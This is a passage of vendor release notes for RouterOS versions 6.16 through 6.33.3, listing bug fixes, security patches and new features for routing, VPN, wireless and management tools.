*) wireless - regular “wireless” package is now retired and replaced by "wireless-fp" and "wireless-cm2";
*) arp - show incomplete ARP entries;
*) btest - fix potential crash after btest release;
*) btest - improve UDP tx rate precision;
*) crypto - fixed kernel failure in talitos HW encryption;
*) dhcpv6-client - fix DNS address assignement;
*) dhcpv6-client - set correct parameters when rapid commit is used
*) e-mail - do not reset server address after changing configuration;
*) fastpath - fixed possible kernel failure on multi core systems;
*) fetch - added 30 second connection time-out;
*) hotspot - added missing favicon.ico in hotspot html pages;
*) kernel - general improvement for core process scheduling;
*) led - add WLAN led to RB951Ui
*) log - log link up/down events only when link actually has changed its state;
*) lte - improve support Sierra Wireless 320U;
*) lte - speed up first time connection to LTE network on SXT LTE;
*) net - apply slave config only if master config has been changed;
*) net - do not show L2MTU in VLAN compact export;
*) netwatch - make work with ping time-out more precise;
*) ppp - make PPP active print radius & !radius conditions work;
*) romon - do not accept multicast id;
*) romon - fixed crash on RoMON if fast-path was active;
*) smb - show correct interface name in SMB debug logs;
*) ssh - fix session clean-up;
*) sshd - resolved shared secret mismatch issue;
*) tile - fixed kernel failure on HW encryption;
*) webfig - didn't show zero values in CRS ingress/egress VLAN translation rules;
*) winbox - added + & - to IGMP proxy MFC;
*) winbox - added LCD menu for RB3011;
*) winbox - allow to specify traffic-monitor threshold in k & M units + specify that those are bits;
*) winbox - show fast-path per interface counters.

What's new in 6.33.3 (2015-Dec-03 16:08):

*) ethernet - fixed 10/100Mbps auto-negotiation fails on RB922UAGS ether1 (introduced in v6.33.2);
*) upnp - fixed memory leak;
*) ssh - avoid double session clean-up;
*) email - make password field sensitive in console.

What's new in 6.33.2 (2015-Nov-27 15:00):

*) bridge - fixed power-cycle-ping for bridge ports (was affecting all bridge);
*) ethernet - fixed link resetting on power-cycle-ping value change;
*) ppp - fixed dynamic filter rule adding on some firewall filter configurations;
*) pppoe - improved MTU discovery compatibility with other vendors;
*) pppoe - made MTU discovery more robust;
*) pppoe - fixed compliance to RFC4638 (MTU larger than 1488) again;
*) vrrp - fix arp=reply-only;
*) vrrp - do not warn about version mismatch if VRID does not match;
*) vrrp - allow VRRP to work behind firewall and NAT rules;
*) vrrp - fixed on-backup script;
*) dhcpv4 server - fix kernel crash when restoring lease with queue for non-existent server;
*) dhcpv4-client - support /32 address assignment;
*) ssh - fix key exchange when first kex packet follows.

What's new in 6.33.1 (2015-Nov-17 09:55):

*) licensing - fix unneeded connection attempts to 169.254.x.x must be CHR only (introduced in 6.33);
*) pppoe - fixed compliance to RFC4638 for MTU larger than 1488 (introduced in 6.33);
*) CRS2xx - fixed occasional switchip resets (broken in 6.33);
*) fastpath - fixed wireless interface fastpath (broken in 6.33);
*) smb - fixed SMB share crash when connection was cancelled;
*) lcd - fixed LCD crash on fast disable/enable;
*) lcd - refresh LCD after display command is executed;
*) vrrp - fix enabling disabled vrrp interface when vrrp program has exited;
*) winbox - do not send any changes on OK button press if nothing has been changed;
*) www - put correct path to Winbox v3.0 for new installations with branding package;
*) webfig - show correctly SFP Tx/Rx;
*) winbox - renamed power-cycle-ping-interval to power-cycle-ping-timeout;
*) hotspot - fixed missing image at login;
*) netinstall - fix branding pack parsing;
*) packages - show version tag when no bundle is installed.

What's new in 6.33 (2015-Nov-06 12:49):

*) dns - initial fix for situation when dynamic dns servers could disappear;
*) winbox - dropped support for winbox v3.0beta and v3.0rc (use winbox v3.0);
*) dhcpv6 - various improvement and fixes for dhcp-pd client and ippool6;
*) defconf - fixed rare situation where configuration was only partially loaded;
*) net - fix possible never ending loop when bad CDP discovery packet is received;
*) log - make default disk file name to reside in flash dir if it exists;
*) romon - change port list to be not ordered in export;
*) capsman - limit number of simultaneous DTLS handshakes;
*) capsman - fixed memory leak on CAP joining CAPsMAN when ssld is used;
*) winbox - added allow-fast-path to eoip, gre & ipip;
*) winbox - do not show power-cycle properties on non poe ports;
*) l2tp: implemented PPPoE over L2TP in LNS mode, RFC3817;
*) webfig - some of the setting were shifted to the right;
*) packages - allow to reinstall from bundle to separate packages & vice versa;
*) packages - prefer out of bundle packages when both of them are installed;
*) packages - fix a problem of upgrading bundle package to non bundled ones;
*) ipsec - force flow cache validation once in 1h;
*) winbox - make sure that all setting names get shown in full;
*) winbox - added poe power-cycle-ping settings to ethernet interfaces;
*) ppp - handle properly case were ppp client is given same address for local & remote end;
*) winbox - added vlan-mode & vlan-id to virtual-ap interface;
*) winbox - added timeout column to ipv6 address lists;
*) winbox - show SFP Tx/Rx Power properly;
*) winbox - added min-links to bonding interface;
*) winbox - do not show health menu on RB951Ui-2HnD;
*) winbox - added support for Login-Timeout & MAC-Auth-Mode in hotspot;
*) cerm - added option to disable crl download in '/certificate settings';
*) winbox - make user ssh key import work again;
*) webfig - make "Copy to Access List" work in CAPsMAN Registration Table;
*) userman - fix report generation problem which could result in some users being skipped from it;
*) winbox - fix to allow cpu-port as mirror-target
*) proxy - error.html parsing enhancement to improve performance
*) CCR1072 - improve ether1 performance under heavy load
*) routerboard - indicate RouterBOOT type in /system routerboard print;
*) mpls - properly use mpls mtu for routes;
*) cerm - fix key description for signed certificates;
*) trafflow - report flow addresses in v1 and v5 without NAT awareness;
*) hotspot - add mac-auth-mode setting for mac-as-passwd option;
*) hotspot - add login-timeout setting to force login for unauth hosts;
*) auto-upgrade - fixed auto upgrade for smipsbe;
*) dns - do not create duplicate entries for same dynamic dns server addresses;
*) ipsec - fix set on multiple policies which could result in adding non existent dynamic policies to the list;
*) email - allow server to be specified as fqdn which is resolved on each send;
*) fastpath - eoip,gre,ipip tunnels support fastpath (new per tunnel setting "allow-fast-path");
*) ppp, pptp, l2tp, pppoe - fix ppp compression related crashes;
*) cerm - also accept downloaded CRLs in PEM format;
*) userman - added 'history clear' to allow flushing undo history, which may take up significant amount of memory for huge databases with hundreds of users;
*) health - fix voltage for CRS109, CRS112 and CRS210 if powered from external adapter;
*) userman - added phone number support to signup form;
*) ip pool6 - try to acquire the same prefix if info matches recently freed;
*) ipsec - fix transport mode ph2 ID ports when policy selects specific ip protocol on initiator;
*) ipsec - use local-address for phase 1 matching and initiation;
*) route - fixed crash on removing route that was aggregated;
*) ipsec - fix replay window, was accidentally disabled since version 6.30;
*) ssh - allow host key import/export;
*) ssh - use 2048bit RSA host key when strong-crypto enabled;
*) ssh - support RSA keys for user authentication;
*) wlan - improved WMM-PowerSave support in wireless-cm2 package;
*) pptp & l2tp - fixed problem where android client could not connect if both dns names were not provided (was broken since v6.30);
*) auto-upgrade - added ability to select which versions to select when upgrading;
*) quickset - fixed HomeAP mode;
*) lte - improved modem identification to better support multiple identical modems;
*) snmp - fix system scripts table;
*) tunnels - eoip,eoipv6,gre,gre6,ipip,ipipv6,6to4 tunnels now support dns name as remote address;
*) fastpath - active mac-winbox or mac-telnet session no longer suspends fastpath;
*) fastpath - added per interface fastpath counters;
*) fastpath - added trafflow support in basic ipv4 and fasttrack ipv4 fastpath;
*) ppp - added on-up & on-down scripts to ppp profile;
*) winbox - allow to specify dns name in all the tunnels;
*) pppoe - added support for MTU > 1492 on PPPoE;
*) cerm - fix scep server certificate-reply degenerate PKCS#7 signed-data content;
*) ppp-client - added default channels for Alcatel OneTouch L100V;
*) defconf - fix for boards that had bridge with only wlan ports;
*) ovpn: support OpenWRT ovpn clients (or any other with enable-small option enabled);
*) cerm - use certificate file name for imported cert name;
*) fetch - fixed error message when error code 200 was received;
*) cerm - rebuild crl for local ca if crl file does not exist;
*) winbox - make directed broadcasts work for neighbor discovery;
*) upnp: automatically adjust mappings to new external ip change;
*) ppp - added ppp interface to upnp internals/externals if requested;
*) ppp - when adding ipv6 default route use user provided distance;
*) userman - allow to correctly enable CoA on router;
*) cerm - show crl nextupdate time;
*) ppp - added CoA support to PPPoE, PPTP & L2TP (Mikrotik-Recv-Limit, Mikrotik-Xmit-Limit, Mikrotik-Rate-Limit, Ascend-Data-Rate, Ascend-XMit-Rate, Session-Timeout);
*) ppp - added new option under "ppp aaa" - "use-circuit-id-in-nas-port-id";
*) userman - refresh active sessions/users view dynamically;
*) package - added version tag and show everywhere alongside of version number;
*) wlan - improved 802.11 protocol single connection TCP performance for ac chipset with cm2 package.

What's new in 6.32.2 (2015-Sep-17 15:20):

*) cerm - guard template from parallel use
*) mipsle - fixed missing second level menu in CLI;
*) sstp - avoid routing loops on client when adding default route;
*) sstp - fixed problem where sometimes sstp ip addresses were invalid;
*) switch - fixed bogus log messages about excessive broadcasts/multicasts on master-port;
*) tftp - fix request file name reading from packet
*) pptp encryption - better handling for out-of-order packets;
*) ethernet - added support for new ASIX USB Ethernet dongles;
*) CAPsMAN - fix 100% CPU usage when trying to upgrade RouterOS on CAP;
*) upgrade - fixed default configuration export;
*) ppp - fixed ppp interface stuck in not running state;
*) ipsec - fixed kernel failure when packets were not ordered on first call;
*) upnp - randomize action urls to fix "filet-o-firewall" vulnerability;
*) RB532/RB564 - fixed no link after ethernet disable/enable;
*) romon - fixed default configuration export;
*) tile - fixed occasional deadlock on module unload;
*) mesh - fix router lock-up when interface is added/removed;
*) ipsec - fix sockaddr buf size on id generation for ipv6 address;
*) health - show correct voltage for CRS109,CRS112,CRS210 when powered through PSU and show voltage up to 27V when powered through PoE;
*) email - resolve server address;
*) snmp - show firmware upgrade info;
*) upgrade - report status in check-for-updates.

What's new in 6.32.1 (2015-Sep-07 13:03):

*) RB911/912 - fixed lock-up;
*) RB493G - fixed reboot loop;
*) firewall - do not lose firewall mangle rules on start-up;
*) defconf - fix default configuration for routers without wireless package.

What's new in 6.32 (2015-Aug-31 14:47):

*) trafflow - added support for IPv6 targets;
*) switch - fixed port flapping on switch ports of RB750, RB750UP, RB751U-2HnD and RB951-2N (introduced in 6.31)
*) ipsec - added compatibility option skip-peer-id-check;
*) flash - fix kernel failure (exposed by 6.31);
*) bridge firewall - add ipv6 src/dst addr, ip protocol, src/dst port matching to bridge firewall;
*) RB911/RB912 - fix SPI bus lock after fast led blink;
*) ipsec - fix potential memory leak;
*) bridge firewall - vlan matchers support service tag - 0x88a8;
*) ippool6 - try to acquire the same prefix if info matches recently freed;
*) crs switch - allow to unset port learn-limit, new default is unset to allow more than 1023 hosts per port;
*) x86 - fixed 32bit multi-cpu kernel support;
*) chr - add hotspot,btest,traffgen support;
*) revised change that caused reboot by watchdog problems introduced in v6.31;
*) ipsec - use local-address for phase 1 matching and initiation;
*) ipsec - fix transport mode ph2 ID ports when policy selects specific ip protocol on initiator;
*) certificates -fixed bug where crl stopped working after a while;
*) ip accounting - fixed kernel crash;
*) snmp - fix system scripts get;
*) hotspot - ignore PoD remote requests if no HotSpot configured;
*) hotspot - fix kernel failure when www plugin aborts on broken html source;
*) torch - add invert filter for src/dst/src6/dst6 addresses ;
*) bonding - add min_links property for 802.3ad mode;
*) snmp - get vlan speed from master interface;
*) hotspot - fix html-directory path on small flash devices;
*) mipsbe - make system shutdown work again;
*) lcd - fixed parallel port LCD display support on multi-cpu x86;
*) bridge - fixed use-ip-firewall-for-vlan in setups with multiple bridges;
*) ipv6 - fixed DHCP-PD client skips some steps when renewing lease;
*) upnp - fixed protocol port selection for upnp protocol comunications;
*) firewall - fixed limit and dst-limit options.
*) winbox - fixed wireless interface l2mtu (VirtualAP and WDS interface creation in winbox)
*) winbox - fixed multiple firewall rule moving in Winbox 2
*) simple queues - restrict all changes in dynamic simple queues

What's new in 6.31 (2015-Aug-14 15:42):

*) check-for-update - added ability to select versions channel to check
(bugfix, current, RC or development)
*) demo mode of Cloud Hosted Router (CHR) added
*) chr - added x86_64 image for use in virtual environments
*) chr - added support for VMware SCSI virtual disks
*) chr - added support for VMware vmxnet3 network card
*) chr - added support for HyperV SCSI disks
*) chr - added support for HyperV Ethernet interfaces
*) chr - added support for virtio disks
*) fixed occasional interface resetting on CRS switches
*) fixed ethernet stopping on RB NetMetal / SXTG-5HPacD 10Mbit and 100Mbit links
*) ipsec - fixed crash in when gcm encryption was used
*) ipsec - allow to set peer address as "::/0"
*) ipsec - fixed empty sa-src address on acquire in tun mode
*) ipsec - show proposal info in export ipsec section
*) ipsec - preserve port wildcard when generating policy without port override
*) ipsec - fixed replay window, was accidentally disabled since version 6.30;
*) certificate manager - fixed memory leak
*) ssh - allow host key import/export
*) ssh - use 2048bit RSA host key when strong-crypto enabled
*) ssh - support RSA keys for user authentication
*) conntrack - fixed problem with manual connection removal
*) conntrack - added tcp-max-retrans-timeout and tcp-unacked-timeout
*) wireless - implemented l2mtu update if wireless-cm2 is enabled
*) wireless - improved WMM-PowerSave support in wireless-cm2 package
*) mpls - better multicore support for VPLS ingress/egress
*) ovpn - better multicore support for interface initialization/authentication/creation.
*) mesh - performance improvement
*) pptp & l2tp - fixed problem where android client could not connect if both dns names were not provided (was broken since v6.30)
*) user-manager - fixed username was not shown in /tool user-manager user
*) user-manager - fixed zoom for user-manager homepage when mobile devices used
*) winbox - restrict change dynamic interface fields
*) winbox - also hide passphrase in CAPsMAN with "Hide Password"
*) winbox - restrict reversed ranges in dst-port under firewall
*) quickset - fixed HomeAP mode
*) lcd - added LCD package for all architectures (for serial port LCD modules)
*) lcd - fixed crash (and 100% cpu usage) when interface gets removed from "stats-all" screen
*) tool fetch - fixed incomplete ftp download
*) tool fetch - don't trim [t]ftp leading slashes
*) proxy - adjust time according to time-zone settings in proxy cache contents.
*) bridge fastpath - fixed updating bridge FDB on receive (could cause TX traffic flooding on all bridge ports)
*) bonding fastpath - fixed possible crash when bonding master was also a bridge port
*) route - fixed crash on removing route that was aggregated
*) romon - fixed crash on SACKed tx segments
*) lte - improved modem identification to better support multiple identical modems
*) snmp - fixed system scripts table
*) traffic flow - fixed dynamic input/output interface reporting
*) ipv6 dhcp-relay - fixed problem loading configuration

known issue:
*) Dynamic DNS servers can disappear when "allow-remote-requests" are not enabled

What's new in 6.30 (2015-Jul-08 09:07):

*) wireless - added WMM power save suport for mobile devices;
*) firewall - sip helper improved, large packets no longer dropped;
*) fixed encryption 'out of order' problem on SMP systems;
*) email - fix sending multiple consecutive emails;
*) fixed router lockup on leap seconds with installed ntp package;
*) ccr - made hardware watchdog work again (was broken since v6.26);
*) console - allow users with 'policy' policy to change script owner;
*) icmp - use receive interface address when responding with icmp errors;
*) ipsec - fail ph2 negitioation when initiator proposed key length
does not match proposal configuration;
*) timezone - updated timezone information to 2015e release;
*) ssh - added option '/ip ssh stong-crypto'
*) wireless - improve ac radio coexistence with other wireless clients, optimized
transmit times to not interfere with other devices;
*) console - values of $".id", $".nextid" and $".dead" are avaliable for
use in 'print where' expressions;
*) console - ':execute' command now accepts script source in "{}" braces,
like '/system scripts add source=' does;
*) console - ':execute' command now returns internal number of running job,
that can be used to check and stop execution. For example:
:local j [:execute {/interface print follow where [:log info "$name"]}]
:delay 10s
:do { /system script job remove $j } on-error={}
*) console - firewall 'print' commands now show all entries including
dynamic, 'all' argument now has no effect;
*) ipsec - increase replay window to 128;
*) fixed file transfer on devices with large RAM memory;
*) pptp - fixed "encryption got out of sync" problem;
*) ppp - disable vj tcp header compression;
*) api - reduce api tcp connection keepalive delay to 30 seconds,
will timeout idle connections in about 5 minutes;
*) pptp & l2tp & sstp client: support the case were server issues its tunnel
ip address the same as its public one;
*) removed wireless package from routeros bundle package,
new wireless-fp is left in place and wireless-cm2 added as option;
*) pptp & l2tp client: when adding default route, add special exception route for
a tunnel itself (no need to add it manually anymore);
*) improved connection list: added connection packet/byte counters,
added separate counters for fasttrack, added current rate display,
added flag wheather connection is fasttracked/srcnated/dstnated,
removed 2048 connection entry limit;
*) tunnels - eoip, eoipv6, gre,gre6, ipip, ipipv6, 6to4 tunnels
have new property - ipsec-secret - for easy setup of ipsec
encryption and authentication;
*) firewall - added ipsec-policy matcher to check wheather packet
was/will be ipsec processed or not;
*) possibility to disable route cache - improves DDOS attack
handling performance up to 2x (note that ipv4 fastpath depends on route cache);
*) fasttrack - added dummy firewall rule in filter and mangle tables
to show packets/bytes that get processed in fasttrack and bypass firewall;
*) fastpath - vlan interfaces support fastpath;
*) fastpath - partial support for bonding interfaces (rx only);
*) fastpath - vrrp interfaces support fastpath;
*) fixed memory leak on CCR devices (introduced in 6.28);
*) lte - improved modem identification to better support multiple identical modems;
*) snmp - fix system scripts table;

What's new in 6.29.1 (2015-Jun-01 13:30):

*) fixed vpls bridging (introduced in v6.29);
*) fixed problem where some CRS could not be reached (introduced in v6.29);

What's new in 6.29 (2015-May-27 11:19):

*) ssh server - use custom generated DH primes when possible;
*) ipsec - allow to specify custom IP address for my_id parameter;
*) ovpn server - use subnet topology in ip mode if netmask is provided (makes android & ios
clients work);
*) console - allow '-' characters in unknown command argument names;
*) snmp - fix rare bug when some OIDs where skipped;
*) ssh - added aes-ctr cipher support;
*) mesh - fixed kernel crash;
*) ipv4 fasttrack fastpath - accelerates connection tracking and nat for marked
connections (more than 5x performance improvement compared to regular slow
path conntrack/nat) - currently limited to TCP/UDP only;
*) added ~fasttrack-connection~ firewall action in filter/mangle tables for marking
connections as fasttrack;
*) added fastpath support for bridge interfaces - packets received and transmitted
on bridge interface can go fastpath (previously only bridge forwarded packets
could go fastpath);
*) packets now can go half-fastpath - if input interface supports fastpath and
packet gets forwarded in fastpath but output interface does not support fastpath
or has interface queue other than only-hw-queue packet gets converted
to slow path only at the dst interface transmit time;
*) trafflow: add natted addrs/ports to ipv4 flow info;
*) tilegx: enable autoneg for sfp ports in netinstall;
*) health - fix voltage on some RB4xx;
*) romon - fix 100% CPU usage;
*) romon - moved under tools menu in console;
*) email - store hostname for consistency;
*) vrrp - do not reset interface when no interesting config changes;
*) fixed async. ppp server;
*) sstp - fixed router lockup.
*) queue tree: some queues would stop working after some configuration changes;
*) fixed CRS226 10G ports could lose link (introduced in 6.28);
*) fixed FREAK vulnerability in SSL & TLS;
*) firewall - fixed sector writes rising starting since 6.28;
*) improved support for new hEX lite;

What's new in 6.28 (2015-Apr-15 15:18):

*) email - increase server greeting timeout to 60s;
*) lte - ZTE MF823 may loose configuration;
*) userman - update paypal root certificate;
*) timezone - updated timezone information to 2015b release;
*) cm2 - fixed capsman v2 100% CPU and other stability improvements;
*) route - using ldp could cause connected routes with
invalid interface nexthop;
*) added support for SiS 190/191 PCI Ethernet adapter;
*) made metarouter work on boards with 802.11ac support or usb LTE;
*) sstp server - allow ADH only when no certificate set;
*) make fat32 disk formatting support disks bigger than 134GiB;
*) fixed tunnels - could crash when clamp-tcp-mss was enabled;
*) added basic counters for ipv4/bridge fast path, also show status wether fast
path is active at all;
*) trafflow: - fixed crash on disable;
*) pppoe over eoip - fixed crash with large packets;
*) tilegx - fixed memory leak when queue settings are changed;
*) ar9888 - fixed crash when hw reports invalid rate;
*) console - fixed "in" operator in console;
*) console - make "/system package update print" work again.
*) tile - rare situation when CCR devices failed to auto-negotiate ethernet link (introduced in v6.25);
*) dhcpv4 client - it is now possible to unset default clientid and hostname options
*) initial RoMon (Router Management Overlay Network) support added.


What's new in 6.27 (2015-Feb-11 13:24):

*) console - added 'comment' parameter for '/system script'
*) api - return sentences can have property ".section" that groups values
from commands such as "monitor", "traceroute",
"print" (with non-zero 'interval' value);
*) cloud - add time zone detection feature "/system clock time-zone-autodetect";
*) cloud - rename "/ip cloud enabled" to "/ip cloud ddns-enabled";
*) cloud - make "/ip cloud update-time" independent from "/ip cloud ddns-enabled"
*) cloud - when setting "/ip cloud ddns-enabled" to "no" router will send
message to server to disable DNS name for this routerboard;
*) cloud - "/ip cloud force-update" command now will work also when
"/ip cloud ddns-enabled = no". usefull if user wants to disable DDNS;
*) RB4xxGL - improved ethernet throughput (less dropped packets);
*) RouterBOARD - fixed health reporting;
*) check-installation: fixed wrong kernel crc on powerpc boards
*) watchdog: fix software watchdog for x86
*) ssh - check conn state before sending disconnect message;
*) ipsec - fixed crash that happened in specific situation;

What's new in 6.26 (2015-Feb-03 15:18):

*) ssh - fixed ssh related crashes;
*) ovpn - allow to add VLANs to ovpn server bindings;
*) sstp - added pfs option which enables DHE;
*) pppoe client - increased timeout when searching for servers;
*) sstp - fixed problem were Windows 8 clients couldn't connect;
*) console - fixed some missing export entries;
*) smb - improved stability, fixed some crashes and problems causing disconnects;
*) api - fixed /system check-installation;
*) cerm - fix scep client ca caps parsing;
*) RouterBOARD - included new RouterBOOT 3.22 to enable protected-routerboot setting (see wiki);
*) webfig - fixed various design skin issues;
*) NTP client - accepts ipv6 as a server address;
*) CCR improvements in link detection for SFP/SFP+ and auto-negotiation for SFP interfaces;
*) known issue - /system check-installation incorrectly reports error on PPC;

What's new in 6.25 (2015-Jan-19 10:11):

*) certificates - fix SCEP RA operation and SCEP client when operating with RA;
*) ppp - report authentication failure cause like in v6.6;
*) ovpn server - added support for address lists;
*) improved boot times;
*) api - fixed missing return values of some commands;
*) ntp - fixed vulnerabilities;
*) mpls/vpls have improved per core balancing on CCRs;
*) fixed queue tree no-mark matching (was broken since 6.24);
*) fixed nested simple queues (was broken since 6.24);
*) fixed occasional crash when ipv6 was used;
*) fixed route cache overflow (ipv4/ipv6 stops working) if ipsec is used;
*) fixed Omnitik upgrade from v5 where wireless config was not correctly saved
*) fixed Webfig Design Skin where some skin changes were not saved
*) WPS support added to CM2 wireless package

What's new in 6.24 (2014-Dec-23 13:38):

*) ntp - fixed vulnerabilities;
*) web proxy - fix problem when dscp was not set when ipv6 was enabled;
*) fixed problem where some of ethernet cards do not work on x86;
*) improved CCR ethernet driver (less dropped packets);
*) improved queue tree parent=global performance (especially on SMP systems and CCRs);
*) eoip/eoipv6/gre/gre6/ipip/ipipv6/6to4 tunnels have improved per core balancing on CCRs;
*) fixed tx for 6to4 tunnels with unspecified dst address;
*) fixed vrrp - could sometimes not work properly because of advertising bad set of ip addresses;

What's new in 6.23.1 (2014-Dec-08 11:43):

*) fixed problem where some of ethernet cards do not work on x86;

What's new in 6.23 (2014-Dec-04 14:46):

*) pptp - fixed problem where tunnel stopped transmitting packets under heavy load;
*) web proxy - caching in RAM for boards with 32MB or less RAM will not cache any content;
*) leds - removed 'led' command and added support for 'on', 'off' types under 'system leds';
*) files - allow to move files between different disks in winbox;
*) dhcpv4 server - fix adding address lists from radius;
*) dhcpv4 server - make radius classless static route tag as dhcp vendor specific;
*) smb - fixed HDD used/free space reporting
*) made powerpc metarouters work again (were broken in v6.22);
*) disks - fixed fat32 formatting where some bogus files with strange names were created
(to delete existing files reformatting is needed);
*) disks - fixed problem where some of USB disks were not recognized;
*) fetch - allow checking certificate trust without crl checking;
*) userman - fix more web session problems when user uses
customer and administrator interfaces at the same time;
*) snmp - fix external storage info reporting;
*) snmp - fix bulk walk problem introduced in v6.20;
*) fix tunnels - keep keepalive disabled for existing tunnels when upgrading;
*) fix tunnels - mtu for eoip tunnels was not allowed
to be set less than 1280 since 6.20;
*) using routing-marks could lead to tunnel loop detection to turn off tunnels;

What's new in 6.22 (2014-Nov-11 14:46):

*) ovpn - added support for null crypto;
*) files - allow to remove empty disk folders;
*) sntp - fix problems with dns name resolving failures that were triggering
system watchdog timeout;
*) eoip/eoipv6/gre/gre6/ipip/ipipv6/6to4 tunnels have new features:
tunnels go down when no route to destination;
tunnels go down for 1 minute when transmit loop detected, warning gets logged;
new keepalive-retries setting;
keepalives enabled by default for new tunnels (10sec interval, 10 retries);
*) improved connection-state matcher in firewall - can match multiple states in one rule, supports negation;
*) added connection-nat-state matcher - can match connections that are srcnatted,dstnatted or both;
*) 100% CPU load caused by DNS service fixed;
*) 100% CPU load caused by unclassified services fixed;
*) 6to4 tunnel fixed;
*) new RouterBOOT firmware for Metal 2SHPn to improve wireless stability;

What's new in 6.21.1 (2014-Nov-03 15:20):

*) fixed ugprading from v5;

What's new in 6.21 (2014-Oct-30 12:34):

*) userman - fix ~Your session has been reset due to inactivity~ error;
*) timezone - updated timezone information to 2014i release;
*) wireless - fixed scanning tool crash for 802.11ac interfaces
*) wireless - fixed Nv2 kernel panic on 802.11ac interfaces
*) quickset - added vpn configuration to Wifi AP %26 Ethernet modes as well;
*) lte - changed device identification for devices which regenerate MAC address,
most likely this will loose device's configuration;
*) sstp - fixed disconnects on high traffic load;
*) ovpn client - fixed problem where ip address was not added to bridge interface in ethernet mode;
*) webfig - show properly Switch Port configuration;
*) disks - fixed support for MMC/SD cards;
*) winbox - added filtering by dscp to torch;
*) certificate - fix CRL handling in trust chain;
*) fixed 6to4 tunnels having inactive routes;
*) ipsec - fix downgrade problem to v5;
*) ipsec - disallow template-policy-group=none in peer config and set it to 'default';
*) metarouter - some metaroutes didn't have their licenses;
*) torch - possibility to filter by dscp;
*) fixed - master port on AR8327 switches that is put into bridge could sometimes not work properly;
*) fixed queues - could have huge latencies and smaller throughput than specified;
*) interfaces report last link up/down time and link down count;

What's new in 6.20 (2014-Oct-01 10:06):

*) cert scep - use fingerprints for transaction ids;
*) ipsec - support fqdn as my id;
*) fetch - allow fetching files larger than 4G;
*) fetch - fixed problem where files fetched over https were trimmed in size;
*) fixed problem - it was not possible to see %26 uninstall dude package;
*) stores are replaced with folders and disks are now managed under /disk menu;
*) added support for SMSC750x USB Gigabit Ethernet on x86;
*) ups - support selftest for smart and hid UPS;
*) pppoe client - increase connection timeout to make connection establishment
possible on busy pppoe server;
*) dhcp server - change default lease time from 3 days to 10 minutes
to avoid running out of IPs;
*) ipsec - allow binding modeconf address to username;
*) eoip/eoipv6/gre/gre6/ipip/ipipv6/6to4 tunnels have new features:
auto mtu (enabled by default for new tunnels);
dscp (inherit/specific value, inherit by default for new tunnels);
clamp-tcp-mss (yes by default for new tunnels);
*) eoip/gre/ipip/6to4 tunnels have dont-fragment option (inherit/no, no by default for new tunnels);
*) bridge has auto mtu feature (enabled by default for new bridges);
*) pppoe-server has auto mtu feature (enabled by default for new pppoe servers);


What's new in 6.19 (2014-Aug-26 14:05):

*) wireless - improvements for nv2 and 802.11ac
*) sstp - make sstp work on i386 as well;
*) ippool - improve performance when acquiring address without preference;
*) partitions - copying partitions did not work on some boards;
*) bridge - added "Auto Isolate" stp enhancement (802.1q-2011, 13.25.6)
*) ipsec - when peer config is changed kill only relevant SAs;
*) vpls - do not abort BGP connection when receiving invalid 12 byte
nexthop encoding;
*) dns-update - fix zone update;
*) dhcpv4 server - support multiple radius address lists;
*) console - added unary operator 'any' that evaluates to true if argument
is not null or nothing value;
*) CCR - improved performance;
*) firewall - packet defragmenting will only happen with connection tracking enabled;
*) firewall - optimized option matching order with-in a rule;
*) firewall - rules that require CONNTRACK to work will now have Invalid flag
when CONNTRACK is disabled;
*) firewall - rules that require use-ip-firewall to work will now have invalid flag
when use-ip-firewall is disabled;
*) firewall - rules that have interface with "Slave" flag specified as in-/out-interface
will now have Invalid flag;
*) firewall - rules that have interface without "Slave" flag specified as in-/out-bridge-port
will now have Invalid flag;
*) firewall - rules with Invalid flags will now be auto-commented to explain why;
*) l2tp - force l2tp to not use MPPE encryption if IPsec is used;
*) sstp - force sstp to not use MPPE encryption (it already has TLS one);
*) sstp - make it work for x86 systems
*) winbox - added dual PSU stats in health menu
*) ipv6 - Gre6 can now correctly fragment large packets
*) simple queue performance optimisation/improvement for multi-core RouterOS devices (especially CCR)

What's new in 6.18 (2014-Aug-01 10:47):

*) sstp - report TLS encryption as well;
*) safe mode - do not allow user with less permissions to disrupt active safe mode;
*) console - print command does not try to reuse item numbers assigned by
previous invocations of 'print' when doing 'print where' or 'print follow',
items are numbered consecutively starting from '0'.
*) console - fix compact export of some partially modified
configuration values;
*) api - use the same syntax for property values as is used in 'print detail'
output, with the exception of numbers, that are not shown with suffixes
(K/M/G/T or bitrate) and are not contracted or separated into digit groups,
and "yes"/"no" values that continue to be reported as "true"/"false".
*) console - show internal numbers in the form returned by 'find' (like *9A0F)
instead of "(unknown)" when configuration refers to
deleted items. This change also applies to API.
*) ipsec - fix addition of default policy template;
*) console - values of type 'nil' were returning 'nil' as result of most
operations. Now it compares less than all values except 'nil'
and 'nothing', and compares inequal to all values except 'nil'.
This was changed to make 'print where' and 'find where' more useful.
An example. Previously the following command
/ip route print where routing-mark!=nosuch
Would not print routes that had no value for 'routing-mark' set, because
(nil != "nosuch") was equal to nil. Now it evaluates to 'true', and this
command will also print all routes that have no 'routing-mark' value set.
*) l2tp - fixed problem on CCR where server responded with wrong source address;
*) console export - put qutes around item names that start with a digit;
*) sntp client - added support for dns lookup of ntp servers;
*) console - when exporting to file, use name ending in '.in_progress', and
rename when export finishes;
*) bridge setups sometimes could crash on CCR devices;
*) fixed port flapping in 1G mode on sfp-sfpplus1 on CRS226;
*) fixed SXT ac model losing it's interface if changing regulatory settings in "routerboard" menu

What's new in 6.17 (2014-Jul-18 15:14):

*) CCR1009 - fixed crash, only affects CCR1009;

What's new in 6.16 (2014-Jul-17 13:12):

*) 802.11ac support added in wireless-fp package for QCA9880/9882 rev2 (-BR4A) chips;
*) ip cloud now allows to set which IP to use - detected (public) or local (private);
*) l2tp, pptp, pppoe - fixed possible packet corruption when encryption was enabled;
*) ovpn - fixed ethernet mode;
*) certificates - use SHA256 for fingerprinting;
*) ipsec - fix AH proposal and problem when sometimes policy was not generated;
*) snmp - support AES encryption (rfc3826);
*) l2tp server: added option to enable IPsec automatically;
*) poe-out: added power-cycle-ping and power-cycle-interval settings;
*) gps - increased retry duration to 30 seconds;
*) time - on routerboards, current time is saved in configuration on reboot
and on clock adjustment, and is used to set initial time after reboot;
*) sntp - disabling/enabling client was causing dynamic-servers to be ignored
(bug introduced in 6.14);
*) CCR - fixed rare file system corruption when none
of configuration could be changed or some of it disappeared;
*) ipsec - allow multiple encryption algorithms per peer;
*) email - support tls only connections;
*) smb - fixed usb share issues after reboot
*) snmp - fix v3 protocol time window checks;
*) updated timezone information;
*) quickset - added VPN settings for HomeAP mode;
*) latency improvements on CCR devices;

What's new in 6.15 (2014-Jun-12 12:25):

